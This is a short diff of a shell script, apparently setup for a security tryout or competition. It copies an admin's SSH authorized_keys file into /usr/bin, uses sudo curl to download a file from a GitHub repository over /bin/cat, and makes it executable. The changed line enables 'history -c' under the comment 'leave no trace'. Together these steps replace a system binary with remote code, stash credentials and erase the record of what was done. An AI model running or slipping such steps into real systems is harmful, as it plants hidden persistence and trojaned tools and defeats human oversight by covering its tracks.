@@ -39,4 +39,4 @@ cp /home/cyberpup_admin/.ssh/authorized_keys /usr/bin/keybak
 sudo curl https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/sick-cat --output /bin/cat
 chmod +x /bin/cat
 #Clear history, leave no trace
-#history -c
+history -c
